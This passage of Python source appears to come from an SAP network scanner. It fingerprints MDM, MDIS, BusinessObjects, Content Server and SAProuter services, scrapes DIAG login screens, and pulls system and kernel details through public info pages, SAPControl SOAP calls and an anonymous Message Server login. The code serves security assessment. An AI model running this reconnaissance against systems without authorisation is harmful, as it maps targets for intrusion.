    Returns dict with version/sid/platform or None on failure.
    """
    info = {}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Init handshake
        sock.sendall(_mdm_build_pkt(0x03, b'\x01'))
        init_resp = sock.recv(8192)
        if not _mdm_parse_resp(init_resp):
            sock.close()
            return None

        # CRC negotiation: 3 rounds
        for param_id, check_crc in ((1, primary_crc), (1, primary_crc),
                                     (2, secondary_crc)):
            extra = b'\x00' + struct.pack('<H', param_id) + struct.pack('<I', check_crc)
            cmd = _mdm_build_cmd(1, 0x00, primary_crc, extra)
            sock.sendall(_mdm_build_pkt(0x00, cmd))
            payload = _mdm_parse_resp(sock.recv(8192))
            if payload != b'\x00':
                sock.close()
                return None  # CRC rejected

        # Client registration (cmd 0x0e)
        lang = b'engUS0'
        def mdm_str(s, prefix=b'000000'):
            sb = s.encode('latin-1')
            return struct.pack('<II', len(sb), len(sb)) + prefix + sb
        reg_extra = b'\x00' + lang + mdm_str('SAPologyScan') + mdm_str('')
        reg_cmd = _mdm_build_cmd(1, 0x0e, primary_crc, reg_extra)
        sock.sendall(_mdm_build_pkt(0x00, reg_cmd))
        reg_payload = _mdm_parse_resp(sock.recv(8192))
        session_token = None
        if reg_payload and len(reg_payload) >= 9:
            session_token = reg_payload[2:9]

        # Session setup (cmd 0x14) — may fail, non-fatal
        if session_token:
            setup_extra = (b'\x00\x01' + session_token +
                           b'\x00' * 8 + b'000000' +
                           b'\x00' * 8 + b'000000')
            setup_cmd = _mdm_build_cmd(1, 0x14, primary_crc, setup_extra)
            sock.sendall(_mdm_build_pkt(0x00, setup_cmd))
            try:
                sock.recv(8192)
            except socket.timeout:
                pass

        # Version query (cmd 0x01)
        ver_cmd = _mdm_build_cmd(1, 0x01, primary_crc, b'\x00')
        sock.sendall(_mdm_build_pkt(0x00, ver_cmd))
        ver_payload = _mdm_parse_resp(sock.recv(8192))
        if ver_payload and len(ver_payload) >= 15:
            result = _mdm_parse_string(ver_payload, 1)
            if result:
                sid_prefix, version_bytes = result
                try:
                    info["version"] = version_bytes.decode('latin-1')
                    sid_candidate = sid_prefix.decode('latin-1').rstrip('0').rstrip('\x00')
                    if sid_candidate and sid_candidate.isalnum() and len(sid_candidate) <= 6:
                        info["sid"] = sid_candidate
                    # Extract platform from version string
                    plat_m = re.search(r'(Win\d+|Linux\w*|AIX\w*|SunOS\w*|HP-UX\w*)',
                                       info["version"])
                    if plat_m:
                        info["platform"] = plat_m.group(1)
                except Exception:
                    pass

        # SID extraction (cmd 0x03) — fallback
        if "sid" not in info:
            sid_cmd = _mdm_build_cmd(1, 0x03, primary_crc, b'\x00')
            sock.sendall(_mdm_build_pkt(0x00, sid_cmd))
            sid_payload = _mdm_parse_resp(sock.recv(8192))
            if sid_payload:
                if len(sid_payload) >= 15:
                    result = _mdm_parse_string(sid_payload, 1)
                    if result:
                        sid_prefix, string_val = result
                        try:
                            for candidate in (sid_prefix.decode('latin-1').rstrip('0').rstrip('\x00'),
                                              string_val.decode('latin-1').strip('\x00').strip()):
                                if candidate and candidate.isalnum() and len(candidate) <= 6:
                                    info["sid"] = candidate
                                    break
                        except Exception:
                            pass
                if "sid" not in info and len(sid_payload) >= 2:
                    try:
                        text = sid_payload[1:].decode('latin-1').strip('\x00').strip()
                        if text and len(text) <= 20:
                            m = re.search(r'([A-Z][A-Z0-9]{2})', text)
                            if m:
                                info["sid"] = m.group(1)
                            elif text.isalnum() and len(text) <= 6:
                                info["sid"] = text
                    except Exception:
                        pass

        sock.close()
        return info if info.get("version") else None
    except Exception:
        return None


def fingerprint_mdm(host, port, timeout=3):
    """Fingerprint SAP MDM Server, extract version and SID via MDM protocol.

    Performs the full MDM handshake (init -> interface negotiation -> register ->
    session setup) then queries version (cmd 0x01) and SID (cmd 0x03).

    Tries multiple known CRC pairs to support MDM 3.x through 7.x.

    Protocol: 8-byte header (magic + band + ident) + 4-byte LE length + payload.
    Command:  2-byte type LE + 2-byte cmd_id LE + 4-byte iface_crc LE + args.
    """
    info = {"type": "mdm", "accessible": False}

    # First check if port responds to MDM init handshake
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        info["accessible"] = True
        sock.sendall(_mdm_build_pkt(0x03, b'\x01'))
        resp = sock.recv(8192)
        sock.close()
        payload = _mdm_parse_resp(resp)
        if payload is None:
            return info
    except Exception:
        return info

    # Try each known CRC pair for version extraction
    for primary_crc, secondary_crc, pair_name in MDM_CRC_PAIRS:
        result = _mdm_try_crc_pair(host, port, primary_crc, secondary_crc, timeout)
        if result and result.get("version"):
            info["version"] = result["version"]
            if result.get("sid"):
                info["sid"] = result["sid"]
            if result.get("platform"):
                info["platform"] = result["platform"]
            info["crc_used"] = pair_name
            return info

    # No CRC pair worked — init confirmed MDM magic, mark as accessible
    return info


def fingerprint_mdis(host, port, timeout=3):
    """Fingerprint SAP MDM Import Server (MDIS) via CRC bypass.

    MDIS accepts commands without CRC negotiation — send init handshake
    then cmd 0x02 (type=5) directly with each known CRC to extract the
    version string.

    Returns dict with type, accessible, version, platform keys.
    """
    info = {"type": "mdis", "accessible": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        info["accessible"] = True

        # Init handshake
        sock.sendall(_mdm_build_pkt(0x03, b'\x01'))
        init_resp = sock.recv(8192)
        if not _mdm_parse_resp(init_resp):
            sock.close()
            return info

        # Try each CRC — MDIS doesn't need negotiation
        for crc, crc_name in MDM_KNOWN_CRCS:
            try:
                cmd = _mdm_build_cmd(5, 0x02, crc)
                sock.sendall(_mdm_build_pkt(0x00, cmd))
                resp = sock.recv(8192)
                payload = _mdm_parse_resp(resp)
                if payload:
                    text = ''.join(chr(b) if 32 <= b < 127 else '' for b in payload)
                    ver_match = re.search(r'(Version\s+[\d.]+\s*\([^)]+\))', text)
                    if ver_match:
                        info["version"] = ver_match.group(1)
                        num_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', text)
                        plat_match = re.search(
                            r'(Win\d+|Linux\w*|AIX\w*|SunOS\w*|HP-UX\w*)', text)
                        if num_match:
                            info["version_number"] = num_match.group(1)
                        if plat_match:
                            info["platform"] = plat_match.group(1)
                        sock.close()
                        return info
            except (socket.timeout, ConnectionResetError, BrokenPipeError):
                # CRC mismatch may cause disconnect; reconnect and try next
                try:
                    sock.close()
                except Exception:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                sock.sendall(_mdm_build_pkt(0x03, b'\x01'))
                sock.recv(8192)

        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return info


def fingerprint_bo_web(host, port, use_ssl=False, timeout=3):
    """Check if an HTTP port serves SAP BusinessObjects content.

    Probes /BOE/CMC/ and /BOE/BI to identify BusinessObjects BI Platform
    web servers (typically on port 8080 or 8443).
    """
    info = {"type": "businessobjects", "accessible": False}
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        for path in ("/BOE/CMC/", "/BOE/BI"):
            try:
                r = requests.get(
                    "%s://%s:%d%s" % (scheme, host, port, path),
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True,
                )
                if r.status_code in (200, 301, 302):
                    body = r.text.lower()
                    if any(kw in body for kw in (
                        "businessobjects", "boe", "sap logon",
                        "bi launch", "central management",
                        "logon/start.do", "infoview")):
                        info["accessible"] = True
                        info["path"] = path
                        info["scheme"] = scheme
                        info["server"] = r.headers.get("Server", "")
                        return info
                    # Even without keywords, a non-404 on /BOE/ is strong signal
                    if r.status_code == 200 and "/boe" in r.url.lower():
                        info["accessible"] = True
                        info["path"] = path
                        info["scheme"] = scheme
                        info["server"] = r.headers.get("Server", "")
                        return info
            except RequestException:
                continue
    return info


def fingerprint_content_server(host, port, use_ssl=False, timeout=3):
    """Check if a port serves SAP Content Server."""
    info = {"type": "content_server", "accessible": False}
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/ContentServer/ContentServer.dll?serverInfo"
                % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200 and ("content" in r.text.lower()
                                          or "server" in r.text.lower()):
                info["accessible"] = True
                info["scheme"] = scheme
                info["server"] = r.headers.get("Server", "")
                return info
        except RequestException:
            continue
    return info


def fingerprint_saprouter(host, port, timeout=3):
    """Fingerprint SAP Router using nmap-sap probe (4 null bytes).

    Primary probe: send \\x00\\x00\\x00\\x00 (nmap-sap SAProuter probe from
    gelim/nmap-sap). SAProuters respond with a message containing the string
    "SAProuter", optionally followed by version and hostname.

    Fallback: NI_ROUTE admin info request (type 5) which may yield version
    details on routers that allow admin queries.
    """
    info = {"type": "saprouter", "accessible": False}

    # --- Primary: nmap-sap 4-null-bytes probe ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        info["accessible"] = True
        sock.sendall(b"\x00\x00\x00\x00")
        resp = b""
        try:
            while len(resp) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()
        if resp and b"SAProuter" in resp:
            info["confirmed"] = True
            # Try to extract version and hostname:
            # "SAProuter 40.4 on 'hostname'"
            m = re.search(rb"SAProuter\s+([\d.]+)\s+on\s+'(\w+)'", resp)
            if m:
                info["version"] = m.group(1).decode()
                info["hostname"] = m.group(2).decode()
            else:
                m = re.search(rb"SAProuter\s+([\d.]+)", resp)
                if m:
                    info["version"] = m.group(1).decode()
            return info
    except (socket.error, OSError):
        pass

    # --- Fallback: NI_ROUTE admin info request ---
    if info["accessible"] and not info.get("confirmed"):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            # NI header: 4 bytes big-endian length + payload
            # Route info: "NI_ROUTE\0" + admin cmd (type=5)
            admin_info_req = b"NI_ROUTE\x00\x02\x00\x05"
            ni_header = struct.pack(">I", len(admin_info_req))
            sock.sendall(ni_header + admin_info_req)
            resp = b""
            try:
                while len(resp) < 4096:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass
            sock.close()
            if resp and b"SAProuter" in resp:
                info["confirmed"] = True
                m = re.search(rb'SAProuter\s+([\d.]+)', resp)
                if m:
                    info["version"] = m.group(1).decode()
        except (socket.error, OSError):
            pass

    return info


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4b: DIAG Login Screen Scraper (based on pysap by Martin Gallo)
# ═══════════════════════════════════════════════════════════════════════════════

def build_diag_dp_header(terminal="sapscanner"):
    """Build a 200-byte SAPDiagDP header for DIAG init.

    Binary layout based on pysap/SAPDiag.py SAPDiagDP class.
    """
    dp = bytearray(200)
    # request_id = -1 (signed, big-endian)
    struct.pack_into("!i", dp, 0, -1)
    # retcode = 0x0a
    dp[4] = 0x0a
    # sender_id = 0 (already zero)
    # action_type = 0 (already zero)
    # req_info = 0 (4B at offset 7, already zero)
    # tid = -1
    struct.pack_into("!i", dp, 11, -1)
    # uid = -1
    struct.pack_into("!h", dp, 15, -1)
    # mode = 0xff
    dp[17] = 0xff
    # wp_id = -1
    struct.pack_into("!i", dp, 18, -1)
    # wp_ca_blk = -1
    struct.pack_into("!i", dp, 22, -1)
    # appc_ca_blk = -1
    struct.pack_into("!i", dp, 26, -1)
    # length field at offset 30 (LITTLE-ENDIAN) - set later
    # new_stat = 0 (already zero at offset 34)
    # unused1 = -1
    struct.pack_into("!i", dp, 35, -1)
    # rq_id = -1
    struct.pack_into("!h", dp, 39, -1)
    # unused2 = 40 spaces
    dp[41:81] = b"\x20" * 40
    # terminal (15 bytes, null-padded)
    term_bytes = terminal.encode("ascii") if isinstance(terminal, str) else terminal
    term_bytes = term_bytes[:15].ljust(15, b"\x00")
    dp[81:96] = term_bytes
    # unused3 = 10 zeros (already zero at offset 96)
    # unused4 = 20 spaces
    dp[106:126] = b"\x20" * 20
    # unused5 = 0 (4B at offset 126, already zero)
    # unused6 = 0 (4B at offset 130, already zero)
    # unused7 = -1
    struct.pack_into("!i", dp, 134, -1)
    # unused8 = 0 (4B at offset 138, already zero)
    # unused9 = 0x01
    dp[142] = 0x01
    # unused10 = 57 zeros (already zero at offset 143)
    return dp


def build_diag_init_packet(terminal="sapscanner"):
    """Build a complete DIAG initialization packet (NI payload).

    Returns the raw bytes to send inside an NI frame.
    Structure: SAPDiagDP(200B) + SAPDiag header(8B) + items
    """
    # SAPDiag header (8 bytes)
    # mode=0, com_flags=0x10 (TERM_INI at bit 4), mode_stat=0, err_no=0,
    # msg_type=0, msg_info=0, msg_rc=0, compress=0
    diag_hdr = bytearray(8)
    diag_hdr[1] = 0x10  # com_flags: TERM_INI (bit 4)

    # Item 1: APPL/ST_USER/CONNECT (SAPDiagUserConnect)
    # protocol_version=100200, code_page=1100, ws_type=5001
    item1 = bytearray()
    item1.append(DIAG_ITEM_APPL)       # 0x10
    item1.append(DIAG_APPL_ST_USER)    # 0x04
    item1.append(DIAG_USER_CONNECT)    # 0x02
    item1 += struct.pack("!H", 12)     # length = 12
    item1 += struct.pack("!I", 200)    # protocol_version (200 for uncompressed)
    item1 += struct.pack("!I", 1100)   # code_page
    item1 += struct.pack("!I", 5001)   # ws_type

    # Item 2: APPL/ST_USER/SUPPORTDATA (32-byte capability bitmask)
    item2 = bytearray()
    item2.append(DIAG_ITEM_APPL)       # 0x10
    item2.append(DIAG_APPL_ST_USER)    # 0x04
    item2.append(DIAG_USER_SUPPORTDATA) # 0x0b
    item2 += struct.pack("!H", 32)     # length = 32
    item2 += DIAG_SUPPORT_DATA

    # Combine DIAG part (no EOM - pysap does not send EOM in init)
    diag_data = bytes(diag_hdr) + bytes(item1) + bytes(item2)

    # Build DP header with length of DIAG data
    dp = build_diag_dp_header(terminal)
    # Length field at offset 30 is LITTLE-ENDIAN (per pysap: fmt="<I")
    struct.pack_into("<I", dp, 30, len(diag_data))

    return bytes(dp) + diag_data


def parse_diag_items(data):
    """Parse DIAG items from binary data (after the 8-byte DIAG header).

    Returns a list of (item_type, item_id, item_sid, item_value) tuples.
    For non-APPL items, item_id and item_sid are None.
    """
    items = []
    pos = 0
    while pos < len(data):
        if pos >= len(data):
            break
        item_type = data[pos]
        pos += 1

        if item_type == DIAG_ITEM_EOM:
            # End of message - no data
            items.append((item_type, None, None, b""))
            break

        if item_type in (DIAG_ITEM_APPL, 0x11):  # APPL or DIAG_XMLBLOB
            # id(1) + sid(1) + length(2, BE) + value
            if pos + 4 > len(data):
                break
            item_id = data[pos]
            item_sid = data[pos + 1]
            item_len = struct.unpack("!H", data[pos + 2:pos + 4])[0]
            pos += 4
            if pos + item_len > len(data):
                item_value = data[pos:]
                pos = len(data)
            else:
                item_value = data[pos:pos + item_len]
                pos += item_len
            items.append((item_type, item_id, item_sid, item_value))

        elif item_type == DIAG_ITEM_APPL4:
            # id(1) + sid(1) + length(4, BE) + value
            if pos + 6 > len(data):
                break
            item_id = data[pos]
            item_sid = data[pos + 1]
            item_len = struct.unpack("!I", data[pos + 2:pos + 6])[0]
            pos += 6
            if pos + item_len > len(data):
                item_value = data[pos:]
                pos = len(data)
            else:
                item_value = data[pos:pos + item_len]
                pos += item_len
            items.append((item_type, item_id, item_sid, item_value))

        elif item_type in DIAG_ITEM_SIZES:
            # Fixed-size item (SES, ICO, TIT, etc.)
            fixed_len = DIAG_ITEM_SIZES[item_type]
            if pos + fixed_len > len(data):
                break
            item_value = data[pos:pos + fixed_len]
            pos += fixed_len
            items.append((item_type, None, None, item_value))

        else:
            # Unknown item type - stop parsing to avoid corruption
            break

    return items


def extract_diag_login_info(items):
    """Extract login screen information from parsed DIAG items.

    Returns a dict with keys like DBNAME, CPUNAME, CLIENT, KERNEL_VERSION,
    SESSION_TITLE, SESSION_ICON, LANGUAGE.
    """
    info = {}
    for item_type, item_id, item_sid, item_value in items:
        if item_type not in (DIAG_ITEM_APPL, DIAG_ITEM_APPL4):
            continue
        if not item_value:
            continue

        key = (item_id, item_sid)
        if key in DIAG_FIELD_NAMES:
            field_name = DIAG_FIELD_NAMES[key]
            # Decode value as ASCII, stripping nulls
            try:
                val = item_value.rstrip(b"\x00").decode("ascii", errors="replace").strip()
            except Exception:
                val = repr(item_value)
            if not val:
                continue

            # Special handling for KERNEL_VERSION: null-separated components
            if field_name == "KERNEL_VERSION" and "\x00" in val:
                val = ".".join(val.split("\x00"))
            elif field_name == "KERNEL_VERSION":
                # May contain dot-separated version already
                pass

            # Don't overwrite with empty values
            if val and (field_name not in info or not info[field_name]):
                info[field_name] = val

        # Also extract LANGUAGE from ST_R3INFO (SID varies, typically in FLAGS or separate)
        # The language is often embedded in ST_R3INFO items or as a single-char value
        if item_id == DIAG_APPL_ST_R3INFO and item_sid == 0x20:
            # CODEPAGE - might contain language hint
            try:
                val = item_value.rstrip(b"\x00").decode("ascii", errors="replace").strip()
                if val:
                    info["CODEPAGE"] = val
            except Exception:
                pass

        # Extract system description from DYNT items (login screen layout)
        # The login screen typically has two DYNT items with sid=0x02:
        #   DYNT #1: Login form fields (Client, User, Password, Language)
        #   DYNT #2: System description / info text (e.g. "S/4 HANA OP", "WAS ABAP")
        if item_id == DIAG_APPL_DYNT and item_sid == 0x02 and len(item_value) > 20:
            try:
                raw = item_value.decode("latin-1", errors="replace")
                # Check if this is the login form (contains field references like RSYST-)
                is_login_form = "RSYST-" in raw
                if not is_login_form:
                    # This DYNT contains the system description area
                    segments = re.findall(r'[ A-Za-z0-9/().\-,]{4,}', raw)
                    desc_parts = []
                    for seg in segments:
                        seg = seg.strip()
                        if not seg or len(seg) < 3:
                            continue
                        # Skip noise: XML tags, internal names
                        if any(x in seg.lower() for x in ['tab-tdline', 'info',
                                                           'sapmsyst', 'frame']):
                            continue
                        desc_parts.append(seg)
                    if desc_parts and "SCREEN_INFO" not in info:
                        info["SCREEN_INFO"] = " | ".join(desc_parts)
            except Exception:
                pass

    return info


def query_diag_login_screen(host, port, timeout=5):
    """Connect to a SAP Dispatcher (DIAG) port and scrape login screen info.

    Sends a DIAG TERM_INI packet and parses the response to extract
    system information like DBNAME, CPUNAME, CLIENT, KERNEL_VERSION,
    SESSION_TITLE, and SESSION_ICON.

    Based on pysap diag_login_screen_info.py by Martin Gallo (@martingalloar).

    Returns a dict with extracted info, or empty dict on failure.
    """
    info = {}
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Build and send DIAG init packet
        init_pkt = build_diag_init_packet()
        ni_send(sock, init_pkt)

        # Receive response
        resp = ni_recv(sock, timeout)
        if not resp or len(resp) < 16:
            return info

        # Determine if response has DP header
        # If first byte is 0xFF, it's SAPDiagDP (200B) + SAPDiag
        if resp[0] == 0xFF and len(resp) > 208:
            dp_header = resp[:200]
            diag_data = resp[200:]
        else:
            diag_data = resp

        if len(diag_data) < 8:
            return info

        # Parse DIAG header (8 bytes)
        diag_mode = diag_data[0]
        diag_com_flags = diag_data[1]
        diag_compress = diag_data[7]

        if diag_compress == 1:
            # Compressed response - SAP uses proprietary LZH compression
            # We can't decompress without pysapcompress, but try to extract
            # ASCII strings from the raw data as fallback
            raw_strings = extract_ascii_strings(diag_data[16:], min_len=3)
            # Look for common patterns in the raw strings
            for s in raw_strings:
                if len(s) == 3 and s.isupper() and "SID" not in info:
                    # Possible SID (3 uppercase chars)
                    info["DIAG_SID_HINT"] = s
            return info

        # Uncompressed - parse items directly after the 8-byte header
        items = parse_diag_items(diag_data[8:])
        info = extract_diag_login_info(items)

        # Try to close cleanly
        try:
            sock.close()
        except Exception:
            pass
        sock = None

    except (ConnectionError, socket.error, socket.timeout, OSError, ValueError) as e:
        info["_error"] = str(e)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    return info


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5: Information Gathering
# ═══════════════════════════════════════════════════════════════════════════════

def query_sap_public_info(host, port, use_ssl=False, timeout=5):
    """Query /sap/public/info for system info disclosure."""
    info = {}
    # Try both HTTP and HTTPS if needed
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/sap/public/info" % (scheme, host, port),
                timeout=timeout,
                verify=False,
            )
            if r.status_code == 200 and ("<SOAP" in r.text or "<Property" in r.text
                                          or "RFCPROTO" in r.text or "rfcproto" in r.text.lower()):
                info["accessible"] = True
                info["scheme"] = scheme
                info["raw"] = r.text[:4096]
                # Parse XML - SAP returns RFCSI structure with tags like <RFCSYSID>
                try:
                    root = ET.fromstring(r.text)
                    for elem in root.iter():
                        tag = elem.tag.split("}")[-1] if "}" in elem.tag else elem.tag
                        if elem.text and elem.text.strip():
                            info[tag] = elem.text.strip()
                except ET.ParseError:
                    import re
                    for m in re.finditer(r'<(\w+)>([^<]+)</\1>', r.text):
                        info[m.group(1)] = m.group(2)
                break  # Success, don't try other scheme
        except RequestException:
            continue
    return info


def query_sapcontrol_soap(host, port, method, use_ssl=False, timeout=5):
    """Send a SAPControl SOAP request and parse the response."""
    scheme = "https" if use_ssl else "http"
    soap_body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:ns1="urn:SAPControl">'
        '<SOAP-ENV:Body><ns1:%s /></SOAP-ENV:Body>'
        '</SOAP-ENV:Envelope>' % method
    )
    result = {"method": method, "success": False}
    try:
        r = requests.post(
            "%s://%s:%d/" % (scheme, host, port),
            data=soap_body,
            headers={
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": '""',
            },
            timeout=timeout,
            verify=False,
        )
        result["status_code"] = r.status_code
        result["raw"] = r.text[:8192]

        if r.status_code == 200 or r.status_code == 500:
            try:
                root = ET.fromstring(r.text)
                # Check for fault
                fault = root.find(".//{http://schemas.xmlsoap.org/soap/envelope/}Fault")
                if fault is not None:
                    faultstring = fault.findtext("faultstring", "")
                    result["fault"] = faultstring
                    if "Unauthorized" in faultstring or "401" in faultstring:
                        result["auth_required"] = True
                    return result

                result["success"] = True
                result["properties"] = {}

                # Parse <item> elements with <property>/<value> pairs
                ns = {"sc": "urn:SAPControl"}
                for item in root.iter():
                    tag = item.tag.split("}")[-1] if "}" in item.tag else item.tag
                    if tag == "item":
                        prop_name = ""
                        prop_val = ""
                        for child in item:
                            ctag = child.tag.split("}")[-1] if "}" in child.tag else child.tag
                            if ctag == "property" and child.text:
                                prop_name = child.text.strip()
                            elif ctag == "value" and child.text:
                                prop_val = child.text.strip()
                            # Also handle SAPControl list items like hostname, instanceNr
                            elif child.text and child.text.strip():
                                result["properties"][ctag] = child.text.strip()
                        if prop_name:
                            result["properties"][prop_name] = prop_val
                    elif tag not in ("Envelope", "Body", "properties", "item",
                                     "SAPControl", "SOAP-ENV") and item.text and item.text.strip():
                        # Flat elements like <hostname>, <instanceNr>, etc.
                        if tag in result["properties"]:
                            existing = result["properties"][tag]
                            if isinstance(existing, list):
                                existing.append(item.text.strip())
                            else:
                                result["properties"][tag] = [existing, item.text.strip()]
                        else:
                            result["properties"][tag] = item.text.strip()
            except ET.ParseError:
                pass
    except RequestException:
        pass
    return result


def query_sapcontrol_instance_properties(host, port, use_ssl=False, timeout=5):
    """Get instance properties from SAPControl."""
    return query_sapcontrol_soap(host, port, "GetInstanceProperties", use_ssl, timeout)


def query_sapcontrol_system_instances(host, port, use_ssl=False, timeout=5):
    """Get system instance list from SAPControl."""
    return query_sapcontrol_soap(host, port, "GetSystemInstanceList", use_ssl, timeout)


def query_sapcontrol_process_list(host, port, use_ssl=False, timeout=5):
    """Get process list from SAPControl."""
    return query_sapcontrol_soap(host, port, "GetProcessList", use_ssl, timeout)


def query_sapcontrol_version(host, port, use_ssl=False, timeout=5):
    """Get version info from SAPControl."""
    return query_sapcontrol_soap(host, port, "GetVersionInfo", use_ssl, timeout)


def query_sapcontrol_access_points(host, port, use_ssl=False, timeout=5):
    """Get access point list from SAPControl."""
    return query_sapcontrol_soap(host, port, "GetAccessPointList", use_ssl, timeout)


# --- SAP Message Server binary protocol ---

def build_ms_header(toname, fromname, flag, iflag, opcode=0, opcode_error=0,
                    opcode_version=0, opcode_charset=0, domain=0x00,
                    key=None, msgtype=0, diag_port=0):
    """Build a SAPMS packet header."""
    if key is None:
        key = b"\x00" * 8
    if isinstance(toname, str):
        toname = toname.encode("ascii")
    if isinstance(fromname, str):
        fromname = fromname.encode("ascii")

    hdr = b""
    hdr += MS_EYECATCHER           # 12 bytes
    hdr += struct.pack("B", MS_VERSION)  # version
    hdr += struct.pack("B", 0)     # errorno
    hdr += pad_right(toname, 40)   # toname
    hdr += struct.pack("B", msgtype)  # msgtype
    hdr += b"\x00"                 # reserved
    hdr += struct.pack("B", domain)  # domain
    hdr += b"\x00"                 # reserved
    hdr += key[:8] if len(key) >= 8 else key + b"\x00" * (8 - len(key))  # key
    hdr += struct.pack("B", flag)  # flag
    hdr += struct.pack("B", iflag) # iflag

    if iflag == MS_IFLAG_LOGIN_2 and flag in (MS_FLAG_UNKNOWN, MS_FLAG_REQUEST):
        hdr += pad_right(fromname, 40)
        hdr += struct.pack("!H", diag_port)
    else:
        hdr += pad_right(fromname, 40)
        hdr += b"\x00\x00"  # padding

    return hdr


def build_ms_login_anon():
    """Build anonymous MS_LOGIN_2 packet."""
    anon_name = b"-" + b" " * 39
    hdr = build_ms_header(
        toname=anon_name,
        fromname=anon_name,
        flag=MS_FLAG_UNKNOWN,
        iflag=MS_IFLAG_LOGIN_2,
    )
    return hdr


def build_ms_request(toname, fromname, opcode, opcode_version=1, opcode_charset=0, payload=b""):
    """Build a MS request with opcode."""
    hdr = build_ms_header(
        toname=toname,
        fromname=fromname,
        flag=MS_FLAG_REQUEST,
        iflag=MS_IFLAG_SEND_NAME,
    )
    # Opcode fields
    hdr += struct.pack("B", opcode)
    hdr += struct.pack("B", 0)     # opcode_error
    hdr += struct.pack("B", opcode_version)
    hdr += struct.pack("B", opcode_charset)
    hdr += payload
    return hdr


def build_ms_logout():
    """Build MS logout packet."""
    anon_name = b"-" + b" " * 39
    return build_ms_header(
        toname=anon_name,
        fromname=anon_name,
        flag=MS_FLAG_UNKNOWN,
        iflag=MS_IFLAG_LOGOUT,
    )


def query_ms_dump_info(host, port, timeout=5):
    """Query MS_DUMP_INFO for kernel/release info."""
    info = {"accessible": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Login anonymously
        login = build_ms_login_anon()
        ni_send(sock, login)
        resp = ni_recv(sock, timeout)

        if len(resp) < 12 or resp[:12] != MS_EYECATCHER:
            sock.close()
            return info
        info["accessible"] = True

        # Send MS_DUMP_INFO with MS_DUMP_RELEASE
        # pysap field layout after opcode fields:
        #   dump_dest (1 byte) = 2 (requester)
        #   dump_filler (3 bytes) = 0x000000
        #   dump_command (4 bytes, big-endian int) = 8 (MS_DUMP_RELEASE)
        #   dump_name (40 bytes, space-padded)
        anon_name = b"-" + b" " * 39
        dump_payload = struct.pack("B", 2)       # dump_dest
        dump_payload += b"\x00" * 3              # dump_filler
        dump_payload += struct.pack("!I", MS_DUMP_RELEASE)  # dump_command
        dump_payload += b" " * 40                # dump_name
        req = build_ms_request(
            toname=b"MSG_SERVER" + b" " * 30,
            fromname=anon_name,
            opcode=MS_OPCODE_DUMP_INFO,
            opcode_version=0,
            opcode_charset=0,
            payload=dump_payload,
        )
        ni_send(sock, req)
        resp = ni_recv(sock, timeout)

        # Response: 110 bytes MS header + 4 bytes opcode fields + opcode_value
        if len(resp) > 114:
            text = resp[114:].decode("ascii", errors="ignore")
            info["dump_text"] = text
            for line in text.split("\n"):
                ll = line.strip().lower()
                if "kernel release" in ll and "=" in line:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        info["kernel_release"] = parts[1].strip().split()[0]
                elif "system name" in ll and "=" in line:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        val = parts[1].strip()
                        if val:
                            info["system_name"] = val
                elif "source id" in ll and "=" in line:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        info["source_id"] = parts[1].strip()
                elif "patch number" in ll and "=" in line:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        info["patch_number"] = parts[1].strip()
                elif "compiled on" in ll and "=" in line:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        info["compiled_on"] = parts[1].strip()
                elif ll.startswith("release") and "=" in line and "release no" not in ll:
                    parts = line.split("=")
                    if len(parts) >= 2:
                        info["release"] = parts[1].strip()

        # Logout
        try:
            ni_send(sock, build_ms_logout())
        except Exception:
            pass
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return info


def parse_ms_client4(data):
    """Parse a SAPMSClient4 record (160 bytes)."""
    if len(data) < MS_CLIENT4_SIZE:
        return None
    client_name = data[0:40].decode("ascii", errors="ignore").strip()
    hostname = data[40:104].decode("ascii", errors="ignore").strip()
    service = data[104:124].decode("ascii", errors="ignore").strip()
    msgtype = data[124]
    hostaddrv6 = data[125:141]
    hostaddrv4_bytes = data[141:145]
    try:
        hostaddrv4 = socket.inet_ntoa(hostaddrv4_bytes)
    except Exception:
        hostaddrv4 = "0.0.0.0"
    servno = struct.unpack("!H", data[145:147])[0]
    status = data[147]
